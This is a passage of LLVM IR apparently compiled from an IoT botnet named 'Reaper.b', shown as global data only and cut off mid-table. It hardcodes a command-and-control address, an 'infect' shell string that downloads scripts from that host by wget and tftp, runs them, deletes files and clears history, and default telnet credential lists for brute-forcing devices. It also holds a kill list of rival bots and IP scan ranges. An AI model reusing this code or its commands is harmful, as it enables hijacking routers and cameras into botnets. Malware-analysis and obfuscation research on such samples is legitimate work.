; ModuleID = 'host/ir_fla/Reaper.b.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@knownBots = global [86 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.82, i32 0, i32 0)], align 16
@.str = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"jackmy*\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"hackmy*\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"arm*\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"b1\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"b2\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"b3\00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"b4\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"b5\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"b6\00", align 1
@.str.16 = private unnamed_addr constant [3 x i8] c"b7\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"b8\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"b9\00", align 1
@.str.19 = private unnamed_addr constant [17 x i8] c"busyboxterrorist\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"DFhxdhdf\00", align 1
@.str.21 = private unnamed_addr constant [10 x i8] c"dvrHelper\00", align 1
@.str.22 = private unnamed_addr constant [8 x i8] c"FDFDHFC\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"FEUB\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"FTUdftui\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"GHfjfgvj\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"jhUOH\00", align 1
@.str.27 = private unnamed_addr constant [9 x i8] c"JIPJIPJj\00", align 1
@.str.28 = private unnamed_addr constant [10 x i8] c"JIPJuipjh\00", align 1
@.str.29 = private unnamed_addr constant [10 x i8] c"kmyx86_64\00", align 1
@.str.30 = private unnamed_addr constant [10 x i8] c"lolmipsel\00", align 1
@.str.31 = private unnamed_addr constant [8 x i8] c"RYrydry\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"tel*\00", align 1
@.str.33 = private unnamed_addr constant [9 x i8] c"TwoFace*\00", align 1
@.str.34 = private unnamed_addr constant [9 x i8] c"UYyuyioy\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str.36 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.37 = private unnamed_addr constant [9 x i8] c"XDzdfxzf\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"xxb*\00", align 1
@.str.39 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.42 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.49 = private unnamed_addr constant [3 x i8] c"10\00", align 1
@.str.50 = private unnamed_addr constant [3 x i8] c"11\00", align 1
@.str.51 = private unnamed_addr constant [3 x i8] c"12\00", align 1
@.str.52 = private unnamed_addr constant [3 x i8] c"13\00", align 1
@.str.53 = private unnamed_addr constant [3 x i8] c"14\00", align 1
@.str.54 = private unnamed_addr constant [3 x i8] c"15\00", align 1
@.str.55 = private unnamed_addr constant [3 x i8] c"16\00", align 1
@.str.56 = private unnamed_addr constant [3 x i8] c"17\00", align 1
@.str.57 = private unnamed_addr constant [3 x i8] c"18\00", align 1
@.str.58 = private unnamed_addr constant [3 x i8] c"19\00", align 1
@.str.59 = private unnamed_addr constant [3 x i8] c"20\00", align 1
@.str.60 = private unnamed_addr constant [6 x i8] c"hackz\00", align 1
@.str.61 = private unnamed_addr constant [5 x i8] c"bin*\00", align 1
@.str.62 = private unnamed_addr constant [5 x i8] c"gtop\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"ftp*\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"tftp*\00", align 1
@.str.65 = private unnamed_addr constant [7 x i8] c"botnet\00", align 1
@.str.66 = private unnamed_addr constant [8 x i8] c"swatnet\00", align 1
@.str.67 = private unnamed_addr constant [8 x i8] c"ballpit\00", align 1
@.str.68 = private unnamed_addr constant [8 x i8] c"fucknet\00", align 1
@.str.69 = private unnamed_addr constant [9 x i8] c"cracknet\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"weednet\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"gaynet\00", align 1
@.str.72 = private unnamed_addr constant [9 x i8] c"queernet\00", align 1
@.str.73 = private unnamed_addr constant [8 x i8] c"ballnet\00", align 1
@.str.74 = private unnamed_addr constant [5 x i8] c"unet\00", align 1
@.str.75 = private unnamed_addr constant [7 x i8] c"yougay\00", align 1
@.str.76 = private unnamed_addr constant [7 x i8] c"sttftp\00", align 1
@.str.77 = private unnamed_addr constant [7 x i8] c"sstftp\00", align 1
@.str.78 = private unnamed_addr constant [7 x i8] c"sbtftp\00", align 1
@.str.79 = private unnamed_addr constant [6 x i8] c"btftp\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"y0u1sg3y\00", align 1
@.str.81 = private unnamed_addr constant [6 x i8] c"bruv*\00", align 1
@.str.82 = private unnamed_addr constant [5 x i8] c"IoT*\00", align 1
@PromServer = global [1 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.83, i32 0, i32 0)], align 8
@.str.83 = private unnamed_addr constant [16 x i8] c"46.101.35.30:23\00", align 1
@infect = global i8* getelementptr inbounds ([341 x i8], [341 x i8]* @.str.84, i32 0, i32 0), align 8
@.str.84 = private unnamed_addr constant [341 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.35.30/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 46.101.35.30 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 46.101.35.30; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c\0D\0A\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [20 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.96, i32 0, i32 0)], align 16
@.str.85 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.86 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.87 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.88 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.89 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.90 = private unnamed_addr constant [8 x i8] c"666666\00\00", align 1
@.str.91 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.92 = private unnamed_addr constant [12 x i8] c"supervisor\00\00", align 1
@.str.93 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"1111\00\00", align 1
@.str.95 = private unnamed_addr constant [9 x i8] c"service\00\00", align 1
@.str.96 = private unnamed_addr constant [6 x i8] c"test\00\00", align 1
@passwords = global [20 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.96, i32 0, i32 0)], align 16
@.str.97 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.98 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.99 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.100 = private unnamed_addr constant [6 x i8] c"tini\00\00", align 1
@.str.101 = private unnamed_addr constant [8 x i8] c"Zte521\00\00", align 1
@.str.102 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@.str.103 = private unnamed_addr constant [10 x i8] c"zyad1234\00\00", align 1
@.str.104 = private unnamed_addr constant [10 x i8] c"1234qwer\00\00", align 1
@.str.105 = private unnamed_addr constant [12 x i8] c"oelinux123\00\00", align 1
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.115, i32 0, i32 0), i8* null], align 16
@.str.106 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.107 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.108 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.109 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.110 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.111 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.112 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.113 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.114 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.115 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.119, i32 0, i32 0), i8* null], align 16
@.str.116 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.117 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.118 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.119 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.126, i32 0, i32 0), i8* null], align 16
@.str.120 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.121 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.122 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.123 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.124 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.126 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* null], align 16
@.str.127 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.128 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.129 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* null], align 16
@Nranges = global [16 x i32] [i32 110, i32 111, i32 112, i32 113, i32 114, i32 115, i32 116, i32 117, i32 118, i32 119, i32 223, i32 1, i32 103, i32 203, i32 202, i32 122], align 16
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.558 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.130 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.131 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 